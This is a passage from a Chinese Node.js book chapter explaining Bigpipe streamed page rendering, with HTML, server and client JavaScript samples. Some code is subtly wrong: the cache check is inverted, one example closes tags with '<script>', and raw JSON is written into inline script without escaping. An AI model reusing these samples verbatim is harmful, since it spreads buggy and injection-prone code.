  <meta charset="UTF-8" />
  <title>Bagpipe示例</title>
  <script src="jquery.js"></script>
  <script src="underscore.js"></script>
  <script src="bagpipe.js"></script>
</head>
<body>
<div id="body"></div>
<script type="text/template" id="tpl_body">
  <div><%=articles%></div>
</script>
<div id="footer"></div>
<script type="text/template" id="tpl_footer">
<div><%=users%></div>
</script>
</body>
<script type="text/javascript">
var bigpipe = new Bigpipe();
bigpipe.ready('articles', function (data) {
  $('#body').html(_.render($('#tpl_body').html(), {articles: data}));
});

bigpipe.ready('copyright', function (data) {
  $("#footer").html(_.render($('#tpl_footer').html(),{users: data}));
});
</script>
</html>
```

#### 2.持续数据输出

模板输出后，整个页面的渲染并没有结束，但用户已经看到了整个页面的大体样子。接下来我们继续输出，与普通的数据输出不同，这里的数据输出之后被前端脚本处理，是故需要对它进行封装处理：

```js
app.get('/profile', function (req, res) {
  if(cache[layout]) {
    cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8');
  }

  res.writeHead(200, {'Content-Type': 'text/html'});
  res.write(render(compile(cache[layout])));

  ep.all('users', 'articles', function () {
    res.end();
  });

  ep.fail(function(err) {
    res.end();
  });

  db.getData('sql1', function (err, data) {
    data = err ? {} : data;
    res.write('<script>bigpipe.set("articles", ' + JSON.stringify(data) + ');<script>');
  });
  db.getData('sql2', function (err, data) {
    data = err ? {} : data;
    res.write('<script>bigpipe.set("copyright", ' + JSON.stringify(data) + ');<script>');
  });
});
```

对于需要渲染到页面上的数据，它的封装如下：

```js
res.write('<script>bigpipe.set("articles", ' + JSON.stringify(data) + ');</script>');
```

这样最终HTML代码的尾巴上还应该由如下这样的代码：

```html
<script>bigpipe.set("articles", "I am article");</script>
<script>bigpipe.set("copyright", "I am copyright");</script>
```

这两行代码的顺序取决于谁先完成两次异步调用。由于Node非阻塞的特性，多次异步调用可以并行执行，谁先结束谁就可以快速推送到HTML页面上，随着前端脚本的执行，就可以更快地渲染到页面上。

相比Facebook原始地Bigpipe应用在PHP这类阻塞式环境中，Node在数据获取上可以并行进行，使得Big匹配更具效果。

#### 3. 前端渲染

前文地bigpipe.ready()和bigpipe.set()是整个前端的渲染机制，前者以一个key注册一个事件，后者则触发一个事件，依次完成页面的渲染机制。这两个函数定义在bigpipe.js文件中，如下所示：

```js
var Bigpipe = function () {
  this.callbacks = {};
}

Bigpipe.prototype.ready = function (key, callback) {
  if(!this.callbacks[key]) {
    this.callbacks[key] = [];
  }

  this.callbacks[key].push(callback);
};

Bigpipe.prototype.set = function (key, data) {
  var callbacks = this.callbacks[key] || [];
  for (var i = 0; i < callbacks.length; i++) {
    callbacks[i].call(this, data);
  }
};
```

#### 4. 小结

Bigpipe将网页布局和数据渲染分离，使得用户在视觉上觉得网页提前渲染好了，其随着数据输出的过程逐步渲染页面，使得用户能够感知页面是活的。这远比一开始给出空白页面，然后在某个时候突然渲染好带给用户的体验更好。Node在这个过程中，其异步特性使得输出能够并行，数据的输出与数据调用的顺序无关，越早调用完的数据可以越早渲染到页面中，这个特性使得Bigpipe更趋完美。

要完成Bigpipe这样逐步渲染页面的过程，其实通过Ajax也能完成，但是Ajax的背后是HTTP调用，要耗费更多的网络连接，Bigpipe获取数据则于当前页面共用相同的网络连接，开销是分销。

完成Bigpipe所要涉及的细节较多，比MVC中的直接渲染要更复杂许多，建议在网站重要的且数据请求事件较长的页面中使用。

## 8.6 总结

本章涉及的内容较为丰富，在Web应用的整个构建过程中，从处理请求到响应请求的整个过程都有原理性阐述，整理本章细节就可以完成一个功能完备的Web开发框架。过去的各种Web技术，随着框架和库的成型，开发者往往迷糊地知道应用框架和库，却不知道细节的实现，这好比没有地图却在野地里行进。本章的内容希望能为Node开发者带来地图似的启发，在开发Web应用时能够心有轮廓，明了细微。

现在知名和成熟的Web框架和Connect、Express等，本章中的内容在这些框架中都有实现，因为行文的原因，本章中的代码实现得较为粗糙，实际使用请使用这些成熟框架。